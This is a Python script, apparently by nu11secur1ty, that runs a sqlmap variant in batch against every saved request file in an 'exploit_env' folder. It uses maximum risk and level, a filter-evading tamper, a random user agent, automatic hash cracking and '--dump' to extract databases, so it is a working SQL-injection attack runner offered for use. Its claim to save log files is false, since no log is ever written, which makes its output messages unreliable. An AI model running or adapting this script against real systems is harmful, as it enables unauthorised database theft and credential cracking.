#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==================================================
Bushido.py - SQLmap Exploit Runner
Author       : nu11secur1ty
Mode         : 2025
Description  : Automatically runs all exploits in exploit_env
               with sqlmap-nu11secur1ty, preserves colorized output,
               logs results, and exits cleanly on Ctrl+C.
==================================================
"""

import os
import subprocess
from datetime import datetime
import sys

def clean_exit(message=None, code=0):
    ts = datetime.now().strftime("%H:%M:%S /%Y-%m-%d/")
    if message:
        print(f"[*] {message} @ {ts}")
    print(f"[*] ending @ {ts}")
    sys.exit(code)

# === Base paths ===
base_dir = os.path.dirname(os.path.abspath(__file__))
sqlmap_path = os.path.join(base_dir, "sqlmap.py")
exploit_dir = os.path.join(base_dir, "exploit_env")

# === Checks ===
if not os.path.isfile(sqlmap_path):
    clean_exit(f"[!] sqlmap.py not found at {sqlmap_path}", 1)
if not os.path.isdir(exploit_dir):
    clean_exit(f"[!] exploit_env folder not found at {exploit_dir}", 1)

exploit_files = [f for f in os.listdir(exploit_dir) if f.endswith(".txt")]
if not exploit_files:
    clean_exit(f"[!] No .txt exploit files found in {exploit_dir}", 1)

timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

try:
    for idx, exploit_file in enumerate(exploit_files, start=1):
        exploit_path = os.path.join(exploit_dir, exploit_file)
        log_file = os.path.join(base_dir, f"{exploit_file}_{timestamp}_log.txt")
        
        print(f"[{idx}/{len(exploit_files)}] Running sqlmap with exploit: {exploit_file}")

        cmd = [
            sys.executable, sqlmap_path,
            '-r', exploit_path,
            '--tamper=space2comment',
            '--dbms=mysql',
            '--time-sec=7',
            '--random-agent',
            '--level=5',
            '--risk=3',
            '--batch',
            '--answers=crack=Y,dict=Y,continue=Y,quit=N',
            '--dump'
        ]

        # Run sqlmap directly to preserve color
        process = subprocess.Popen(cmd)
        process.wait()

        if process.returncode != 0:
            print(f"[!] sqlmap exited with error on {exploit_file}")
        else:
            print(f"[+] Finished exploit: {exploit_file}, log saved to {log_file}\n")

except KeyboardInterrupt:
    clean_exit("[!] Interrupted by user", 1)

clean_exit("[+] All exploits finished successfully")
